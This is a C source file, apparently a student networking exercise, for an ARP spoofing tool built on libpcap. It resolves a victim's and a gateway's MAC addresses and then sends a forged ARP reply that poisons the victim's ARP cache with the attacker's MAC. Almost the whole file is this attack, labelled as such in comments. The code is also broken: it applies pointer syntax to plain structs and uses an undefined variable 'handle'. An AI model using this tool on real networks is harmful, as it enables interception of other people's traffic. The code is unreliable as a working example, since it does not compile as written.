#include "my_pcap.h"

const char* dev;
pcap_t *pcd;

struct addr{
	uint8_t mac[6];
	uint8_t ip[4];
};

// major changed. for the concise code, I used my own addr structure.
struct addr myaddr,sender,target;

int main(int argc, char* argv[]) {
    struct pcap_pkthdr *header;
	const uint8_t *packet_recv;
	char errbuf[PCAP_ERRBUF_SIZE]; // 256
	u_char* sender_mac;
	int length = 0;
	u_int8_t packet[1500];
	struct ether_header *eptr;
	struct arp_hdr_ *aptr;
	
	if (argc != 4) {
        	puts("[-]Usage : ./arp_send [interface] [sender_ip] [target_ip]");
        	return -1;
	}
	
	dev = argv[1];
	printf("\n[+] device : %s\n",dev);

	GET_MYMACIP(&myaddr,dev);   // saved in myaddr structure & print out
	
	// argv[2],argv[3] to sender and target
	inet_pton(AF_INET,argv[2],sender.ip); //10진수 IP 주소를 2진수 IP 주소로 변환하는 함수
	inet_pton(AF_INET,argv[3],target.ip); //senderIP: victim / targetIP == gateway
		
	pcd = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
	if(pcd == NULL){
	    fprintf(stderr, "Couldn't open device: %s\n", errbuf);
		exit(1);
	}

	// me(attacker) request to victim for mac address.
	gen_arp_packet(packet, myaddr->mac, NULL, myaddr->ip, sender->ip, ARPOP_REQUEST);
	pcap_send_check(pcd, packet);

	while(1) {
		pcap_next_ex(pcd, &header, &packet_recv);
		eptr = (struct ether_header *) packet_recv;
		aptr = (struct arp_hdr_ *) (packet_recv + 14);
		if(ntohs(eptr->ether_type) == ETHERTYPE_ARP && ntohs(aptr->ar_op) == ARPOP_REPLY)	break;
	}
	memcpy(sender->mac, aptr->sender_mac, ETHER_ADDR_LEN);

	gen_arp_packet(packet, myaddr->mac, NULL, myaddr->ip, target->ip, ARPOP_REQUEST);
	pcap_send_check(pcd, packet);


	while(1) {
		pcap_next_ex(handle, &header, &packet_recv);
		eptr = (struct ether_header *) packet_recv;
		aptr = (struct arp_hdr_ *) (packet_recv + 14);
		if(ntohs(eptr->ether_type) == ETHERTYPE_ARP && ntohs(aptr->ar_op) == ARPOP_REPLY)   break;
	}
	memcpy(target->mac, aptr->sender_mac, ETHER_ADDR_LEN);

	puts("\n----- NOW INJECT -----\n");

	gen_arp_packet(packet, myaddr->mac, sender->mac, target->ip, sender->ip, ARPOP_REPLY);
	pcap_send_check(pcd,packet);

	printf("\n[ FINISHED ]\n");
	
	return 0;

}

